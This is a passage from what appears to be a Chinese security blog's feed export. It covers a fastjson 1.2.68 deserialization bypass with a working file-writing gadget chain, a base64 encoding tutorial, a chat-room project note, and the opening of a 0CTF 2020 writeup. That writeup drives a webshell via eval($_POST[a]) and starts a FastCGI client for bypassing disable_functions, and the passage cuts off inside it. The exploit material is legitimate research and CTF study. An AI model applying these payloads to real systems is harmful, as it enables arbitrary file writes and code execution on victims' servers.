<p><img src="https://i.loli.net/2019/03/08/5c827bbf258ed.jpg" alt=""></p>
<p>只要抢先在底下对 $this-&gt;filter 赋值之前给他赋值就行了.</p>
<p>最后需要添加一个 method=GET, 不然没有路由信息</p>
<p><img src="https://i.loli.net/2019/03/08/5c827bc64c589.jpg" alt=""></p>
<p>比较遗憾的是, 在比较后面的版本中必须打开 App::debug 或者有 captcha 模块才能利用.</p>
<p>因为有很多地方都调用了 input 方法, 所以 payload 有很多种, 不过本质都是通过类的构造函数来覆盖变量导致 filterValue 被错误的执行.</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>audit</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记</title>
    <url>/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>以此祭奠找 gadgets 逝去的青春, orz</p>
<a id="more"></a>

<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>既然已经出了补丁, 首先 diff 一下新版本与旧版本的差别, 这里因为 fastjson 会更新旧版本, 自然优先去 diff 旧版本的 sec 更新. 而不是去看 git log, 这样可以节省点时间, 因为 sec 更新只包含漏洞修补, 没有 feature 的更新.  </p>
<p>这里挑了 1.2.48 版本:<br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/</a><br><a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/" target="_blank" rel="noopener">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/</a></p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">$ diff 1.2.48-sec09/com/alibaba/fastjson/parser/ParserConfig.java  1.2.48-sec10/com/alibaba/fastjson/parser/ParserConfig.java</span><br><span class="line">71a72</span><br><span class="line">&gt;     public static final String    SAFE_MODE_PROPERTY        = "fastjson.parser.safeMode";</span><br><span class="line">75a77</span><br><span class="line">&gt;     public static  final boolean  SAFE_MODE;</span><br><span class="line">87a90,93</span><br><span class="line">&gt;             String property = IOUtils.getStringProperty(SAFE_MODE_PROPERTY);</span><br><span class="line">&gt;             SAFE_MODE = "true".equals(property);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         &#123;</span><br><span class="line">185a192</span><br><span class="line">&gt;     private boolean                                         safeMode               = SAFE_MODE;</span><br><span class="line">214a222,224</span><br><span class="line">&gt;                 0xD54B91CC77B239EDL,</span><br><span class="line">&gt;                 0xD59EE91F0B09EA01L,</span><br><span class="line">&gt;                 0xD8CA3D595E982BACL,</span><br><span class="line">244a255</span><br><span class="line">&gt;                 0x1CD6F11C6A358BB7L,</span><br><span class="line">273a285</span><br><span class="line">&gt;                 0x535E552D6F9700C1L,</span><br><span class="line">291c303,305</span><br><span class="line">&lt;                 0x7AA7EE3627A19CF3L</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;                 0x7AA7EE3627A19CF3L,</span><br><span class="line">&gt;                 0x7ED9311D28BF1A65L,</span><br><span class="line">&gt;                 0x7ED9481D28BF417AL</span><br><span class="line">497a512,519</span><br><span class="line">&gt;     public boolean isSafeMode() &#123;</span><br><span class="line">&gt;         return safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     public void setSafeMode(boolean safeMode) &#123;</span><br><span class="line">&gt;         this.safeMode = safeMode;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt; </span><br><span class="line">1033a1056,1059</span><br><span class="line">&gt;         if (this.safeMode) &#123;</span><br><span class="line">&gt;             throw new JSONException("safeMode not support autoType : " + typeName);</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt; </span><br><span class="line">1038,1045c1064,1075</span><br><span class="line">&lt;             if (expectClass == Object.class</span><br><span class="line">&lt;                     || expectClass == Serializable.class</span><br><span class="line">&lt;                     || expectClass == Cloneable.class</span><br><span class="line">&lt;                     || expectClass == Closeable.class</span><br><span class="line">&lt;                     || expectClass == EventListener.class</span><br><span class="line">&lt;                     || expectClass == Iterable.class</span><br><span class="line">&lt;                     || expectClass == Collection.class</span><br><span class="line">&lt;                     ) &#123;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;             long expectHash = TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">&gt;             if (expectHash == 0x90a25f5baa21529eL</span><br><span class="line">&gt;                     || expectHash == 0x2d10a5801b9d6136L</span><br><span class="line">&gt;                     || expectHash == 0xaf586a571e302c6bL</span><br><span class="line">&gt;                     || expectHash == 0xed007300a7b227c6L</span><br><span class="line">&gt;                     || expectHash == 0x295c4605fd1eaa95L</span><br><span class="line">&gt;                     || expectHash == 0x47ef269aadc650b4L</span><br><span class="line">&gt;                     || expectHash == 0x6439c4dff712ae8bL</span><br><span class="line">&gt;                     || expectHash == 0xe3dd9875a2dc5283L</span><br><span class="line">&gt;                     || expectHash == 0xe2a8ddba03e69e0dL</span><br><span class="line">&gt;                     || expectHash == 0xd734ceb4c3e9d1daL</span><br><span class="line">&gt;             ) &#123;</span><br></pre></td></tr></table></figure>

<p>明显看到 expectClass 的判断出了变化, 甚至加了层 hash, 有种此地无银三百两的味道 233.<br>这里修改下 fastjson-blacklist, 改成用 <code>TypeUtils.fnv1a_64</code> 来计算 hash, 可以得到新增了三个类型的判断, <code>java.lang.AutoCloseable</code>, <code>java.lang.Readable</code>, <code>java.lang.Runnable</code>.  </p>
<p>这里稍微跟了下程序, 发现 expectClass 的作用其实相当于一个临时白名单, 这里有两个特性:  </p>
<ol>
<li>比如有个  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line">    String aaa;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAaa</span><span class="params">(String aaa)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.aaa = aaa;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    Face test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(Face test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>那么通过 <code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;: \&quot;Test\&quot;, \&quot;aaa\&quot;: \&quot;zz\&quot;}}&quot;, Test2.class);</code> 是可以反序列化的, fastjson 会对当前反序列化类的 field 的类型作为 type 传进 <code>JavaBeanDeserializer.deserialze</code>. 最后成为 expectClass 代入 checkAutoType 中, 如果 @type 指定的类是 expectClass 的子类, 就可以在黑名单不禁止的情况下通过检查, 这样就可以为 interface 制定类.  </p>
<ol start="2">
<li>还有一个特性, 那就是会直接为 field 创建 JavaBeanDeserializer, 这个更强一些, 无视黑名单以及白名单, 但是前提有一个类的 field (或者 setter) 使用了才行. 比如:  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    java.lang.Thread test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(java.lang.Thread test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Thread\&quot;}}&quot;, Test2.class);</code> 会直接将 Thread 反序列化, 无视了黑名单 (实际上直接绕过了 checkAutoType, SafeMode 下依然可以反序列化), 但这个明显鸡肋很多, 毕竟那些危险类一般情况下都是没用的. 没人会作为 filed 来使用.  </li>
</ol>
<p>这次漏洞也是因为特性 1 的原因. 但还有一个原因才能导致漏洞, 那就是 AutoCloseable 是在内置的反序列化 classMappings 中的, 没错, 就是之前缓存绕过 autoType 的那个 mapping. 所以导致了 AutoCloseable 是能直接被反序列化的, 这里可以根据特性一, 构造</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">    <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">    <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样可以直接绕过 autoType 的检查, 得到 java.io.FileOutputStream, 此处是直接用 <code>&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code> 构造出了 JavaBeanDeserializer, 而不是跟上面的例子一样通过 filed 的方式. 相信看到这里, 就已经有想法了, 可以通过 AutoCloseable 的子类来完成相关的攻击.  </p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复方式从上面的 diff 中可以看出是在原来的基础上加了几个, 实际上可以看到原来本身就是有防御的, 因为有些内置类是以 Object 作为 setter, 构造函数的参数类型的, 如果不 ban 掉, 就可以直接反序列化任意类了. 这次的漏洞更像是某种意义上的黑名单被绕过, 不过可以看到 AutoCloseable 是 Closeble 的父类, 不知道为什么会在 Closeble 已经被 ban 掉的情况下忘记添加 AutoCloseable, 可能是忘记了? 233</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里分享一条我找到的不需要三方库的链, 注意虽然不需要三方库, 但只能在 openjdk &gt;= 11 下利用, 因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的, 所以可以多利用一些内部类, 但是 openjdk 8, 包括 oracle jdk 都是不带这些信息的, 导致无法反序列化, 自然也就无法利用. 所以相对比较鸡肋, 仅供学习. orz  </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"sun.rmi.server.MarshalOutputStream"</span>,</span><br><span class="line">    <span class="attr">"out"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.util.zip.InflaterOutputStream"</span>,</span><br><span class="line">        <span class="attr">"out"</span>: &#123;</span><br><span class="line">           <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">           <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">           <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"infl"</span>: &#123;</span><br><span class="line">           <span class="attr">"input"</span>: &#123;</span><br><span class="line">               <span class="attr">"array"</span>: <span class="string">"eJxLLE5JTCkGAAh5AnE="</span>,</span><br><span class="line">               <span class="attr">"limit"</span>: <span class="number">14</span></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"bufLen"</span>: <span class="string">"100"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"protocolVersion"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致思路是从上面已经写出来的 FileOutputStream 开始, 找到一个能往里面指定写入内容的类, 这里要一次传入两个参数, 所以只能通过构造函数或者两个 setter 来设置, 比较尴尬的是没有找到可以直接触发的, 还需要再调用一次 write/close/flush 才能真正写入内容, 最后又找到了 <code>sun.rmi.server.MarshalOutputStream</code>, 可以写入不可控内容, 才真正完成 exp.  </p>
<p>这里可以通过反射来暴力搜索函数相关参数, 加快搜索过程, 但也是很麻烦的 orz</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>base64 编码原理详解</title>
    <url>/2018/04/26/base64%20%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>之前一直都是直接无脑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64e</span><br></pre></td></tr></table></figure>

<p>只知道大概 base64 是啥东西, 今天突然心血来潮花了几分钟了解了下 base64, 其实原理并不复杂.  </p>
<a id="more"></a>

<p>所以今天不做个 api caller, 自己实现一下 base64 编码玩玩. 首先先了解一下 base64 的实际用途, 主要是将一个字节 (1 byte、8 bit) 转换为可以直接显示的字符, 比如一个文件内容是 <code>\x66\x12\x13\x14</code> 就可以将其转化为 <code>ZhITFA==</code>. 这样就可以通过一些只能输入可见字符的设备、协议或者格式来传递二进制文件, 比如在 json 中就可以将文件 base64 编码后传递. 在 acsii 中除去空格和两个换行符号, 一共有 93 个可显示字符, 而一个字节一共有 2^8=256 种可能, 无法全部一一与 93 个字符对应, 所以我们可以通过另一种取巧的办法, 将 3 个字节拼在一起, 用 4 个 6 bits 来代替.  </p>
<p>这样就可以直接用 2^6=64 个可显示字符一一对应 6 个 bits 的所有可能性. 这也是 base64 里面 64 的来历, 其他 16、32 也是同理, 只是用了更少的字符对应更少的 bits, 但同时对应的存储损耗更大. 比如: base64 转化后每个可见字符保存时占用大小是一个字节, 但却需要 4 个可见字符来表示转化前的 3 个字节, 使得大小是原来的 4/3, 所以一般都使用 base64. 接下来了解了原理后就可以直接实现了, 像图中所示一样, 需要取高低六位、高低四位、高低二位. 我们可以用 python 中的位运算实现.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHighSix</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">252</span> &amp; num) &gt;&gt; <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLowSix</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">63</span> &amp; num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLowTwo</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">3</span> &amp; num) &lt;&lt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHighTwo</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">192</span> &amp; num) &gt;&gt; <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHighFour</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">240</span> &amp; num) &gt;&gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLowFour</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">15</span> &amp; num) &lt;&lt; <span class="number">2</span></span><br><span class="line"></span><br><span class="line">接下来我们需要一个字符表来一一对应字符与各个 <span class="number">6</span> bits 的关系,</span><br><span class="line"></span><br><span class="line">codeTable = [</span><br><span class="line">    <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>,</span><br><span class="line">    <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>,</span><br><span class="line">    <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>,</span><br><span class="line">    <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>,</span><br><span class="line">    <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">然后我们就可以写一个简单的函数将 <span class="number">3</span> 个字节转换为 <span class="number">4</span> 个字符,</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeThreeBytes</span><span class="params">(bytecodes)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(bytecodes) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"The bytecode's length should be three."</span>)</span><br><span class="line">    </span><br><span class="line">    fisrt = getHighSix(bytecodes[<span class="number">0</span>])</span><br><span class="line">    second = getLowTwo(bytecodes[<span class="number">0</span>]) + getHighFour(bytecodes[<span class="number">1</span>])</span><br><span class="line">    third = getLowFour(bytecodes[<span class="number">1</span>]) + getHighTwo(bytecodes[<span class="number">2</span>])</span><br><span class="line">    fourth = getLowSix(bytecodes[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> codeTable[fisrt] + codeTable[second]  + codeTable[third]  + codeTable[fourth] </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    等价于:</span></span><br><span class="line"><span class="string">    return codeTable[getHighSix(bytecodes[0])] + codeTable[getLowTwo(</span></span><br><span class="line"><span class="string">        bytecodes[0]) + getHighFour(bytecodes[1])] + codeTable[getLowFour(</span></span><br><span class="line"><span class="string">            bytecodes[1]) + getHighTwo(bytecodes[2])] + codeTable[getLowSix(</span></span><br><span class="line"><span class="string">                bytecodes[2])]</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure>

<p>最后需要注意的是当输入的 bytes 长度不是 3 的倍数时, 需要对其补一个或者两个纯零即 <code>\x00</code> 字节后再进行编码,<br>完成后将结果的倒数一、二个字符替换成 = 号表示这是补零而来即可.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64encode</span><span class="params">(bytecodes)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(bytecodes) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b''</span></span><br><span class="line">        </span><br><span class="line">    status = <span class="number">0</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bytecodes = bytecodes.encode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(bytecodes)% <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        status = <span class="number">1</span></span><br><span class="line">        bytecodes += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(bytecodes)% <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        status = <span class="number">2</span></span><br><span class="line">        bytecodes += <span class="string">b'\x00\x00'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(bytecodes) / <span class="number">3</span>)):</span><br><span class="line">        result += encodeThreeBytes(bytecodes[i * <span class="number">3</span>:i * <span class="number">3</span> + <span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>] + <span class="string">"="</span></span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-2</span>] + <span class="string">"=="</span>   </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>这样我们就完成了一个简单的 base64 编码, 最后可以写个 tests 来验证.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> myBase64</span><br><span class="line"></span><br><span class="line">bytecodes = <span class="string">b'\x12\x66\x23\xff'</span></span><br><span class="line">org = myBase64.b64encode(bytecodes)</span><br><span class="line">std = base64.b64encode(bytecodes).decode()</span><br><span class="line"></span><br><span class="line">print(org)</span><br><span class="line">print(std)</span><br><span class="line">print(org == std)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">输出:</span></span><br><span class="line"><span class="string">EmYj/w==</span></span><br><span class="line"><span class="string">EmYj/w==</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Socket 实现简单的加密 IRC 聊天室</title>
    <url>/2018/01/24/Socket%20%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E5%8A%A0%E5%AF%86%20IRC%20%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
    <content><![CDATA[<p>很早就打算在寒假写一个聊天室了哈, 用了两天空余时间终于写出来了, 功能非常非常非常简陋, 但是还是勉强能用的2333 (其实最坑的是没有写对数据进行分段处理的功能, 所以私聊模式下单次最多发送117bytes的信息). 可以抵御MITM(通过对数据进行RSA加密或者签名)和重放攻击(通过在数据中加入时间戳).  </p>
<a id="more"></a>

<p>PS： 对所有人说话的情况下信息是明文传输的.对特定人说话, 也就是私聊模式, 数据是加密的, 只有服务器和接收者能看到明文, 如果要服务器也不能看到的话得又得写一串加密www, 因为懒我就不写了<br>强迫症发作把这个功能加上了, 私聊模式下会从服务器获取对方的公钥.相当于端对端加密, 服务器也无法知道双方说了什么, 只知道是对谁说的.如果遭受MITM攻击, 则除了知道是私聊之外什么也不知道 (连发给谁也不知道).<br>丢在 <a href="https://github.com/rmb122/Encrypted-chat-room" target="_blank" rel="noopener">github</a> 上了 233 </p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>TCTF/0CTF 2020 Writeup</title>
    <url>/2020/06/29/TCTF-0CTF-2020-Writeup/</url>
    <content><![CDATA[<p>又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz</p>
<a id="more"></a>

<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>直接给了 webshell, 看 phpinfo,  </p>
<p>disable_functions:<br>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl<br>open_basedir: /var/www/html<br>disable_classes: ReflectionClass<br>Server API:    FPM/FastCGI  </p>
<p>看样子是需要 rce, 有 disable_functions 和 open_basedir 的限制, 这里可以看到用的是 fpm 而且 fsockopen 没有限制, 可以想到直接打 fcgi, 不过需要知道 unix socket 的路径, 这里可以用 DirectoryIterator 来列目录, 不过试了下只能列根目录, 其他地方还是会被 open_basedir 拦, 比较神奇. 不过好在 fuzz 了一下, 是个常见未知, 在 <code>unix:///var/run/php-fpm.sock</code>.<br>之后就不用多说了, 用 PHP_VALUE 里面的 open_basedir 覆盖掉 php.ini 里的 open_basedir 即可.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_php_code</span><span class="params">(s)</span>:</span></span><br><span class="line">    res = sess.post(<span class="string">'http://pwnable.org:19260/?rh=eval($_POST[a]);'</span>, data=&#123;<span class="string">"a"</span>: s&#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">class AA</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    const VERSION_1            = 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const BEGIN_REQUEST        = 1;</span></span><br><span class="line"><span class="string">    const ABORT_REQUEST        = 2;</span></span><br><span class="line"><span class="string">    const END_REQUEST          = 3;</span></span><br><span class="line"><span class="string">    const PARAMS               = 4;</span></span><br><span class="line"><span class="string">    const STDIN                = 5;</span></span><br><span class="line"><span class="string">    const STDOUT               = 6;</span></span><br><span class="line"><span class="string">    const STDERR               = 7;</span></span><br><span class="line"><span class="string">    const DATA                 = 8;</span></span><br><span class="line"><span class="string">    const GET_VALUES           = 9;</span></span><br><span class="line"><span class="string">    const GET_VALUES_RESULT    = 10;</span></span><br><span class="line"><span class="string">    const UNKNOWN_TYPE         = 11;</span></span><br><span class="line"><span class="string">    const MAXTYPE              = self::UNKNOWN_TYPE;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const RESPONDER            = 1;</span></span><br><span class="line"><span class="string">    const AUTHORIZER           = 2;</span></span><br><span class="line"><span class="string">    const FILTER               = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const REQUEST_COMPLETE     = 0;</span></span><br><span class="line"><span class="string">    const CANT_MPX_CONN        = 1;</span></span><br><span class="line"><span class="string">    const OVERLOADED           = 2;</span></span><br><span class="line"><span class="string">    const UNKNOWN_ROLE         = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const MAX_CONNS            = 'MAX_CONNS';</span></span><br><span class="line"><span class="string">    const MAX_REQS             = 'MAX_REQS';</span></span><br><span class="line"><span class="string">    const MPXS_CONNS           = 'MPXS_CONNS';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const HEADER_LEN           = 8;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Socket</span></span><br><span class="line"><span class="string">     * @var Resource</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_sock = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Host</span></span><br><span class="line"><span class="string">     * @var String</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_host = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Port</span></span><br><span class="line"><span class="string">     * @var Integer</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_port = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Keep Alive</span></span><br><span class="line"><span class="string">     * @var Boolean</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_keepAlive = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Constructor</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $host Host of the FastCGI application</span></span><br><span class="line"><span class="string">     * @param Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket</span></span><br><span class="line"><span class="string">    